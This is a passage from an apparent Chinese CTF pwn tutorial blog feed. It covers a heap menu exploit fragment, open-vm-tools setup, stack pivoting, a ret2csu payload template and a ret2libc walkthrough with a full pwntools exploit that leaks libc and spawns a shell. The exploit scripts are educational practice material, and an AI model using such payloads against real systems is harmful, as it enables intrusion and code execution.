class="string">&quot;Input page\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;4.show&quot;</span>)</span><br><span class="line">add()</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add()</span><br><span class="line">payload = <span class="string">b&quot;sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">len</span>(payload)</span><br><span class="line">payload +=p32(<span class="number">0x8048642</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ps:从堆开始 我们将会频繁使用python中的def 因为菜单题的重复接收输送实在是太多了</p><p>如果看不懂这样书写的语法 可以自行百度学习</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>复制粘贴问题解决</title>
      <link href="/2022/09/30/%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
      <url>/2022/09/30/%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>Ubuntu20.04无法安装vmtools 或者出现安装了也没办法做到物理机和虚拟机复制粘贴共用</p><p>所以这里我们用open-vm-tools 这是一个vmtools官方承认的开源工具</p><p>其一样可以起到vmtools的作用</p><p>第一步输入下面的指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove open-vm-tools</span><br></pre></td></tr></table></figure><p>第二步我们输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>但是很遗憾 会出现这样的问题</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256174.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256174.png" alt="a"></a></p><p>这时候我们需要更改一下下载源</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256916.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256916.png" alt="b"></a></p><p>网上的方法是说在这里搜索software-update 但是我查看了以后发现找不到</p><p>最后找到的解决办法是</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256539.png" title="c" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256539.png" alt="c"></a></p><p>因为还没有安装输入法 所以只能先输入set 然后打开设置</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256201.png" title="d" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256201.png" alt="d"></a></p><p>一直向下滑 直到看到关于 点进去 找到软件更新 再点进去</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256452.png" title="e" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256452.png" alt="e"></a></p><p>如图所示 点开后选择other(也可能显示成其他 看你刚创建虚拟机时的语言选择)</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256639.png" title="f" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256639.png" alt="f"></a></p><p>这里挑一个选 我选择的是阿里云的 </p><p>!<a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256796.png" title="g" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256796.png" alt="g"></a></p><p>退出的时候会提醒你这个 直接点重新载入就好了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256251.png" title="h" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022256251.png" alt="h"></a></p><p>在终端中输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>然后我们再输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>发现就可以了</p><p>安装完成之后 在终端输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>重启一下虚拟机 发现就可以做到物理机和虚拟机复制粘贴互通了</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决</p><p>今天所要讲到的内容，也是和栈溢出字节数不够有关</p><p>当可以供我们编写的字节数仅够覆盖到ret addr时，并且该程序内并没有后门函数可以供我们利用，我们又该如何实现系统调用呢？</p><p>我们以往的简单栈溢出是通过覆盖ret addr的办法控制程序执行流导向后门函数的位置</p><p>但是其本质上 ebp和esp并没有被我们所控制，他仍然是按照原先栈底的汇编代码所运行的</p><p>所以我们换个思路？不妨劫持esp和ebp，让他们前往bss段或者其他可以供我们自由写入的区</p><p>这样我们就可以自己构建一个后门函数，并且将程序执行流引导至其</p><p>那问题就来到了如何劫持esp和ebp 我们先得清楚一下栈帧这个概念</p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构</p><p>简单理解就是每次函数的调用，都会生成自己的栈帧</p><p>栈帧就相当于函数的调用框架，包含了函数的参数，函数的局部变量，函数执行完后的返回地址</p><p>系统是如何定义一个栈帧的？ebp指向了栈帧的栈底，esp指向了函数的栈顶</p><p>也就是说，我们把esp和ebp劫持的目的，就是让系统错以为我们写入shellcode的bss段(包括但不限)是一个栈帧</p><p>从而执行他</p><h2 id="栈迁移原理"><a href="#栈迁移原理" class="headerlink" title="栈迁移原理"></a>栈迁移原理</h2><p>归根到底，就是要如何劫持esp和ebp</p><p>回到我们最开始的栈溢出，我们要溢出的字节数&#x3D;变量var距离esp的字节数+一个字长</p><p>这里的一个字长覆盖的是ebp</p><p>在我们没有对ebp覆盖的时候，其保存的是上层函数的栈底地址，而ret addr保存的是上层函数执行到了哪个地方，方便子函数结束后返回父函数最后执行的地方</p><p>在一个栈帧结束的时候，<strong>eip</strong> 即将执行 <strong>leave</strong> 与 <strong>ret</strong> 两条指令恢复现场(即返回父函数)</p><p>leave指令相当于 mov esp ebp和pop ebp</p><p>他将ebp和esp指向同一地址，这一步相当于腾出了栈帧空间</p><p>随后pop ebp 将此时esp指向的old ebp(因为我们上面说过了嘛，ebp保存的是上层函数的栈底地址)赋值给真正的ebp(此时的ebp是定义栈帧栈底的ebp)</p><p>是不是有点晕？首先你要分清楚ebp保存的内容和ebp寄存器这两个概念</p><p>在子函数调用开始之前，系统会将父函数栈底的地址弹出到新的栈帧，这个值就是ebp(就是我们之前栈溢出用垃圾数据覆盖的那个嘛)</p><p>然后记录下当前父函数运行到的地址，将其弹出为ret addr，等子函数结束以后，就会返回到这个地址</p><p>所以说，如果我们覆盖ebp的时候不用垃圾数据，而是放入我们要使ebp迁移到的地址，那么ebp就会被我们挟持走</p><p>但是此时还有个esp寄存器怎么办？栈帧的空间需要这二者才能定义</p><p>你还记不记得我们构造rop链的手法？我们自己再找一个leave的汇编代码地址然后覆盖ret addr不就好了？</p><p>此时mov esp ebp会起到什么效果？ebp已经指向了我们要迁移的地址，所以esp也被挟持到了那边</p><p>但是注意，还有一句pop ebp 虽然这句没有任何作用，因为此时新的栈帧的栈顶，其保存的已经是我们要挟持到的地方的地址</p><p>但是这一句是出栈指令，此时我们的esp，他指向的地址就会增加一个字长</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258131.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258131.png" alt="a"></a></p><p>如图所示，HijackAddr就是我们想要劫持esp ebp到的地址</p><p>那栈迁移运作的原理我们已经搞清楚了是吧，接下来想办法构造payload</p><p>payload &#x3D; cyclic(offset)+pxx(addr)+pxx(leave_addr)</p><p>这一个没有问题吧</p><p>那只剩下最后一个问题了，我们迁移到的那个地址的栈内容要怎么编写</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258267.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258267.png" alt="b"></a></p><p>aaaa是我们最开始的那个地址存放的垃圾数据，即上文说到的HijackAddr,因为pop ebp的原因，esp会指向高一个字长的地方</p><p>dddd则是32位情况下的传参，中间要隔个垃圾数据，这没什么好说的</p><p>下一个binsh_addr 和binsh字符串是什么意思，当程序连binsh都没给我们的话，反正我们都能自己编写一段栈帧了，我们不是可以自己写入一段binsh，然后我们也知道其地址了，不是就能调用了</p><p>后面的old_ebp和ret_addr也没什么好说的，就是一段栈帧必须的要素</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2022/09/25/ret2csu/"/>
      <url>/2022/09/25/ret2csu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接</p><p>不一定有那么刚好的汇编代码可以供我们构造rop链</p><p>今天我们了解的这种方法，将不受动态链接或者静态链接的限制</p><p>我们今天的主角就是libc_csu_init函数，其作用是对libc进行初始化，由于绝大多数的程序都会调用函数，所以libc_csu_init是一定存在的(对于调用函数的程序而言)</p><p>那么这个函数究竟有什么奇效，让我们可以做到随意构造rop链呢？</p><p>来看看在ida中，这个函数是什么样子的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004011B0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004011B0                 public __libc_csu_init</span><br><span class="line">.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004011B0 ; __unwind &#123;</span><br><span class="line">.text:00000000004011B0                 push    r15</span><br><span class="line">.text:00000000004011B2                 mov     r15, rdx</span><br><span class="line">.text:00000000004011B5                 push    r14</span><br><span class="line">.text:00000000004011B7                 mov     r14, rsi</span><br><span class="line">.text:00000000004011BA                 push    r13</span><br><span class="line">.text:00000000004011BC                 mov     r13d, edi</span><br><span class="line">.text:00000000004011BF                 push    r12</span><br><span class="line">.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004011C8                 push    rbp</span><br><span class="line">.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004011D0                 push    rbx</span><br><span class="line">.text:00000000004011D1                 sub     rbp, r12</span><br><span class="line">.text:00000000004011D4                 sub     rsp, 8</span><br><span class="line">.text:00000000004011D8                 call    _init_proc</span><br><span class="line">.text:00000000004011DD                 sar     rbp, 3</span><br><span class="line">.text:00000000004011E1                 jz      short loc_4011FE</span><br><span class="line">.text:00000000004011E3                 xor     ebx, ebx</span><br><span class="line">.text:00000000004011E5                 nop     dword ptr [rax]</span><br><span class="line">.text:00000000004011E8</span><br><span class="line">.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011E8                 mov     rdx, r15</span><br><span class="line">.text:00000000004011EB                 mov     rsi, r14</span><br><span class="line">.text:00000000004011EE                 mov     edi, r13d</span><br><span class="line">.text:00000000004011F1                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004011F5                 add     rbx, 1</span><br><span class="line">.text:00000000004011F9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011FC                 jnz     short loc_4011E8</span><br><span class="line">.text:00000000004011FE</span><br><span class="line">.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011FE                 add     rsp, 8</span><br><span class="line">.text:0000000000401202                 pop     rbx</span><br><span class="line">.text:0000000000401203                 pop     rbp</span><br><span class="line">.text:0000000000401204                 pop     r12</span><br><span class="line">.text:0000000000401206                 pop     r13</span><br><span class="line">.text:0000000000401208                 pop     r14</span><br><span class="line">.text:000000000040120A                 pop     r15</span><br><span class="line">.text:000000000040120C                 retn</span><br><span class="line">.text:000000000040120C ; &#125; // starts at 4011B0</span><br><span class="line">.text:000000000040120C __libc_csu_init endp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们的目光聚集到<strong>loc_4011FE</strong>和<strong>loc_4011E8</strong></p><p>我们暂且把loc_4011E8命名为gadget1，把loc_4011FE命名为gadget2</p><p>由于逻辑顺序的原因，所以我们这里先介绍gadget1</p><p>可以看到他先将rsp的位置增加8个字节，这8个字节尤为关键，我们下面再进行解释</p><p>接着他pop了多个寄存器，但是仍然没有我们需要的rdi和rsi，不过先别急，再往下想想</p><p>最后一行有个retn，我们可以利用这个ret将返回地址修改为gadget2，用意在你看完整个的流程分析后就会明白</p><p>再把目光看到gadget2</p><p>mov指令将r15和r14以及r13的数据分别传给了寄存器rdx，rsi和<strong>edi</strong>，这样子实际上就实现了我们要调用函数首先要做到的传参</p><p>这里解释一下edi，我们之前不是说过在64位的情况下，是r开头的吗，其实情况也不是绝对的</p><p>64位情况下的edi只能改写rdi低32位字节的数据，高32位的字节是无法更改的，不过此时rdi的高32位的数据为0，并不影响我们更改rdi的值</p><p>接下来的call指令就是重头戏，可以看到他call的值是r12+rbx*8</p><p>有没有一种可能，如果我们把rbx赋值为0，而把r12赋值为我们想要执行的函数地址(为什么不反过来，一是*8转化不方便，还有一个原因下面讲到)，那么我们就可以实现函数调用</p><p>接着对rbx进行了+1的操作 而我们上面讲到，我们准备把rbx的值设置为0，所以此时的rbx就为1</p><p>cmp对于rbx和rbp二者进行了对比，如果二者相同，则不进行下一条指令，也就是jnz的跳转，即重新执行一次刚才的汇编代码</p><p>所以此时我们需要将rbp的值设置为1，才能使其于rbx相等</p><p>收回思绪，我们接着想，程序执行完gadget2后会怎么样？</p><p>其实没有多高深的想法，他会按照顺序接着执行下去，那么又回到了我们的gadget1</p><p>接下来，由于我们已经实现了我们想要的寄存器传参，所以此时的寄存器是什么值我们已经不在乎了</p><p>我们可以简单的用cyclic(8*7)简单的实现填充垃圾数据，然后在末尾的ret在自行决定我们接下来要返回的地址</p><p>缕清楚了整个__libc_csu_init函数的思路，我们来回顾一下刚才提出的问题，rsp+8会怎么影响我们的程序，我们来用图表示一下栈结构试试看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255963.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255963.png" alt="a"></a></p><p>第一行和第二行以及第三行没有什么好解释的 常规的栈溢出 然后控制返回地址使程序返回到libc_csu_init函数</p><p>此时的sp指针，是指向到了add rsp+8这行汇编代码，+8即让其继续向栈顶增进了一个字长，所以此时我们要在add rsp+8该行汇编代码处填充的数值，可以是任何，即垃圾数据</p><p>那么，总结一下，我们可以得出一个通用的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = offset * &#x27;a&#x27;  </span><br><span class="line">#栈溢出的垃圾数据字节数</span><br><span class="line">payload += p64(gagdet2_addr) + &#x27;a&#x27; * 8    </span><br><span class="line">#gadgets2的地址</span><br><span class="line">payload += p64(0) + p64(1)</span><br><span class="line">#rbx=0, rbp=1</span><br><span class="line">payload += p64(r12)</span><br><span class="line">#call调用的地址</span><br><span class="line">payload += p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">#三个参数的寄存器</span><br><span class="line">payload += p64(gagdet1_addr)</span><br><span class="line">#gadgets1的地址</span><br><span class="line">payload += &#x27;a&#x27; * 56</span><br><span class="line">#第二次pop 由于寄存器是啥数值我们已经不需要了 所以56个字节全部用垃圾数据覆盖</span><br><span class="line">payload += p64(last)</span><br><span class="line">#函数最后的返回地址</span><br></pre></td></tr></table></figure><p>这里还有一点需要注意的 r12这里输入的地址应该是调用函数的got表地址</p><p>具体解释可以看HNCTF2022的一题wp</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc</title>
      <link href="/2022/09/23/ret2libc/"/>
      <url>/2022/09/23/ret2libc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前置知识了解"><a href="#前置知识了解" class="headerlink" title="前置知识了解"></a>前置知识了解</h2><p>随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量</p><p>那么我们还有办法自己构建一个后门函数吗</p><p>不知道还记不记得在最开始的栈溢出那一题，我们提到了plt表和got表</p><p>在当时，为了照顾新手入坑pwn的感受，我们只是粗略的得出plt调用函数，got存真实地址的服务于做题的结论</p><p>现在，让我们解释一下这个结论的原因</p><p>我们先前已经讲过，got表的作用是因为动态链接的存在，为了使应用程序方便的获取libc中的真实地址</p><p>并且只有当程序运行和函数调用过后，got表中保存的才会是该函数的libc的绝对地址</p><p>而plt表虽然引用的也是got表中的真实地址，但是注意这里并不是说明got表能够调用这个函数</p><p>plt表之所以能够调用函数，而got不行的关键原因是因为plt表还起到了把控制(程序执行流)转移到对应的函数</p><p>当然上述的解释并不详细，许多原理性的问题没有讲到，如果将来想要死磕pwn的同学，建议花时间去专研透底层逻辑的问题(当然现在没有必要)</p><p>所以我们是不是可以得出一条逻辑链，当程序没有给予我们现成的后门函数的时候，我们可以通过system的plt表来调用system函数</p><p>但是说的容易做起来难，我们如何获得system函数的plt表地址呢？</p><p>这里我们只需要记住一个公式 <strong>真实地址 &#x3D; 基址 + 偏移</strong></p><p>即我们通过puts等函数泄露出来的函数地址是真实地址，我们可以通过计算偏移来求出libc基址</p><p>然后依据libc基址和偏移量得出其他函数的真实地址，从而随意调用</p><p>但是如果我们不了解libc版本，即题目附件并为给出呢</p><p>这里还需要了解一下libc中函数地址偏移的概念</p><p>如果开启了pie保护机制，函数的地址将在每次运行时发生变化</p><p>但是其后三位由于虚拟地址页的映射机制，将不会发生变化(前提是在同一个libc版本中)</p><p>因此，如果题目没有给予我们libc文件的话，我们可以通过函数的后三位来推演出libc版本，从而求得libc基址</p><h2 id="wp演示"><a href="#wp演示" class="headerlink" title="wp演示"></a>wp演示</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257159.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257159.png" alt="a"></a></p><p>先看一下保护机制，但是看不出什么苗头</p><p>拖到ida里面看看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Glad to meet you again!What u bring to me this time?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok.See you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个fgets输入任意字节的数据可以用来栈溢出，但是看了下函数列表，好像没有后门函数可以供我们返回</p><p>并且程序也没有提供给我们可以用来泄露函数地址的puts等</p><p>没办法了，我们只能连同puts函数泄露其真实地址一起构造</p><p>看到这里是不是仍然不太明白，看看exp的构造就知道了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">from</span> pwn <span class="keyword">import</span>*   </span><br><span class="line"><span class="number">2</span> io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28548</span>)</span><br><span class="line"><span class="number">3</span> elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="number">4</span> libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="number">5</span> io.recvuntil(<span class="string">&quot;Glad to meet you again!What u bring to me this time?&quot;</span>)</span><br><span class="line"><span class="number">6</span> puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">7</span> main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="number">8</span> rdi_addr = <span class="number">0x400753</span></span><br><span class="line"><span class="number">9</span> ret_addr = <span class="number">0x40050e</span></span><br><span class="line"><span class="number">10</span> puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">11</span> puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">12</span> payload = cyclic(<span class="number">40</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"><span class="number">13</span> io.sendline(payload)</span><br><span class="line"><span class="number">14</span> io.recvuntil(<span class="string">&quot;Ok.See you!&quot;</span>)</span><br><span class="line"><span class="number">15</span> puts_addr = u64(io.recvuntil(<span class="string">&quot;\nGlad to meet you again!What u bring to me this time?\n&quot;</span>,drop =            <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="number">16</span> libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">17</span> system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="number">18</span> binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="number">19</span> payload = cyclic(<span class="number">40</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="number">20</span> io.sendline(payload)</span><br><span class="line"><span class="number">21</span> io.recvuntil(<span class="string">&quot;Ok.See you!&quot;</span>)</span><br><span class="line"><span class="number">22</span> io.interactive()</span><br></pre></td></tr></table></figure><p>第四行这里，我们之所以要装载题目附件所给我们的libc-2.31.so文件</p><p>是因为我们需要获取该libc版本的各函数相较于基址的偏移</p><p>同理，这里还有两种办法可以获取(实际上还有三种，但是最后一种我还不会用[截止到文章发布，如果后续学会了将会补上])</p><p><strong>获取libc版本偏移-第一种办法</strong></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257867.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257867.png" alt="b"></a></p><p>在该网站 我们可以通过输入对应函数的后3位数值来检索对应的libc版本(比如图中检索到了3个版本，通常是都得试试的)</p><p><a href="https://libc.blukat.me/">libc database search (blukat.me)</a></p><p><strong>获取libc版本偏移-第二种办法</strong></p><p>libcsearch这个工具也能获取偏移</p><p>由于网上对于这个工具的安装和使用不计其数</p><p>这里我只负责介绍这个工具，安装过程如果出现问题可以看看这个博客<a href="https://blog.csdn.net/qq_40026795/article/details/107150265">(3条消息) LibcSearcher的安装使用_Catch_1t_AlunX的博客-CSDN博客</a></p><p>说回到exp，我们继续往下看，截止到12行的第一个payload都是一些前置的要点获取</p><p>cyclic生成40个字节的垃圾数据这个没有任何难度理解</p><p>rdi寄存器传参这条之前也解释过了，puts_got显然就是将puts函数的真实地址传给rdi</p><p>接下来的puts_plt便是调用puts函数，输出puts函数的真实地址</p><p>接着为什么要返回到main函数？因为我们还需要接收puts的真实地址，并且我们只能输入96个字节的数据，如果一次性构造payload过长则无法成功</p><p>第三个疑点来到了15行，有很多我们没有见过的语法？</p><p>u64，[-6:]，ljust？这些都是什么东西，一个一个讲</p><p><strong>u64&#x2F;u32</strong></p><p>不知道你还记不记得我们之前讲过的bite型，他起到了<strong>数据的传输和存储的作用</strong></p><p>你是不是一直有个疑问，为什么我们要用到p64和p32</p><p>实际上p是将括号内的数据打包成二进制字节数据流(可以理解为bite型)</p><p>而如果我们要想接收，并且转化为我们能看懂的数据类型，就需要用到u</p><p>为了方便理解，我们看一下如果没有u64，我们得到的数据会是什么样子<a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257770.png" title="c" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257770.png" alt="c"></a></p><p>其作用就是决定recv从倒数第n个字节开始读取</p><p>但是为什么这里是6呢？我们试试4，5，7这些数字会导致什么结果<a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257191.png" title="d" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257191.png" alt="d"></a></p><p>这里不知道你发现没有，一个字节对应着两个字符(之前提过了，这里小复习一下)</p><p>并且由于小端序，所以我们从倒数第几个字节开始接收，影响着我们得到的真实地址的后三位</p><p>拜托，这可是致命的错误，后三位错了我们还怎么获得偏移</p><p>通常，函数的真实地址虽然是8字节(64位)，但是由于其头两个字节的数据恒为00 00</p><p>所以我们只需要从倒数第六字节开始读取(反而言之，就是你要从倒8处读也行)</p><p>欸 你说 我偏不要呢 我就不要[-6:]你来帮我限制读入的字节数量</p><p>反正我就8字节的地址呗</p><p>如果你尝试了以后就会报错，为什么？</p><p>因为我们不单单只读入了函数的真实地址，数据传输以及内存地址分配是一个复杂的过程</p><p>而我们将其改为100试试，仍然可以正常读入数据</p><p>但是你会发现在地址结尾处多出来了个0a，实际上他是换行符，这个换行符是哪里来的？</p><p>仔细观察14行 我们在接收的时候，并未一起接收换行符</p><p>这一点说明了什么?修改为100后都能读取倒上一个字符串的数据了，那我们刚刚不还说在函数地址上面，还有很多其他数据呢？</p><p>这里就可以介绍介绍ljust了</p><p><strong>ljust</strong></p><p>他的作用就是限制我们读入的字节总数，如果不够的话则以我们设定好的字符填充</p><p>所以我们哪怕[-n:]中的n取到了100也仍然不会报错</p><p>说回exp 在第一个payload输送完以后，我们成功获得函数的真实地址</p><p>接着就是计算偏移然后求得其他函数以及binsh字符串的地址</p><p>还是老办法构造payload，并且这里还需要一个ret来栈对齐</p><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>一点小补充吧 相信会有人和我有一样的疑问，在刚接触到ret2libc的时候</p><p>既然我们都将got表中的puts函数真实地址作为参数存储在了rdi寄存器中输送再接收</p><p>而且获取真实地址的方法只需要一个elf.got就行了</p><p>为什么我们不能直接拿这个地址来进行计算基址呢？</p><p>很简单，我们debug看一下，如果我们直接使用got表中的真实地址，他是一个什么东西</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257384.png" title="e" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022257384.png" alt="e"></a></p><p>我们再看一下 通过我们上文的办法得到的真实地址长什么样子</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258270.png" title="f" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258270.png" alt="f"></a></p><p>可以看到明显不一样</p><p>这是因为got表中保存的值是需要运行过后才会为真实地址，所以我们需要将其打印出来再接收(这里我也有点不太理解，埋个坑，日后填)</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
